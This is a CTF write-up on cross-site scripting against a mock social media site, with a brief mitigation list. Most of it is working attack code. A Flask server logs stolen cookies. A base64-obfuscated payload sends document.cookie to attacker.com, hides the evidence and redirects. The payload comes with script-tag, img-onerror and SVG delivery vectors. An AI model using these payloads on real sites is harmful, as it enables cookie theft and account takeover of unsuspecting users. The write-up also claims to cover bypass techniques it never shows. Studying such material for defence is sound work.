# XSS Deep Dive

## Introduction
In this writeup, we'll explore a sophisticated cross-site scripting (XSS) vulnerability found in a recent CTF challenge. We'll cover the discovery, analysis, and exploitation of multiple XSS vectors.

## Challenge Overview
- **Category**: Web Security
- **Points**: 450
- **Description**: A social media platform with various user interaction points. Find and exploit XSS vulnerabilities to steal admin cookies.

## Initial Analysis

Set up a collection server:
```python
from flask import Flask, request

app = Flask(__name__)

@app.route('/collect', methods=['GET'])
def collect():
    cookie = request.args.get('c')
    with open('cookies.txt', 'a') as f:
        f.write(f"{cookie}\n")
    return 'ok'

app.run(host='0.0.0.0', port=8000)
```

### Final Payload
Combined multiple vectors for reliability:
```javascript
// Base64 encoded payload
const payload = btoa(`
    fetch('http://attacker.com/collect?c=' + btoa(document.cookie))
    .then(r => r.text())
    .then(t => {
        // Clean up evidence
        document.body.innerHTML = 'Loading...';
        location = 'http://target.com/';
    });
`);

// Delivery methods
const vectors = {
    bio: `<script>eval(atob('${payload}'))</script>`,
    
    comment: `<img src="x" onerror="eval(atob('${payload}'))">`,
    
    svg: `<?xml version="1.0" standalone="no"?>
    <!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
    <svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
        <script type="text/javascript">
            eval(atob('${payload}'))
        </script>
    </svg>`
};
```

## Mitigation
To prevent XSS:
1. Implement proper input validation
2. Use content security policy (CSP)
3. Apply context-aware output encoding
4. Set secure cookie flags
5. Validate file uploads thoroughly

## Conclusion
This challenge demonstrated:
- Multiple XSS vectors
- Defense bypass techniques
- Payload optimization
- Automated exploitation

Key takeaways:
1. Always validate and encode user input
2. Implement defense in depth
3. Regular security testing
4. Keep up with new bypass techniques 